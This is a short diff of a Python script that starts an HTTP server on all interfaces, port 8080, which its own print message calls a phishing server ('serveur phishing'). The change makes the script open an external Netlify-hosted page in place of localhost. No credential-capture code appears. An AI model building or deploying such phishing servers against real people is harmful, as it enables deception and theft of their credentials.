@@ -21,7 +21,7 @@ def run_server():
     server_address = ('', 8080)  # Toutes interfaces, port 8080
     httpd = HTTPServer(server_address, RequestHandler)
     print(f"Démarrage du serveur phishing sur http://localhost:8080")
-    webbrowser.open('http://localhost:8080')
+    webbrowser.open('https://vocal-rugelach-ddb83e.netlify.app/')
     httpd.serve_forever()
 
 if __name__ == '__main__':
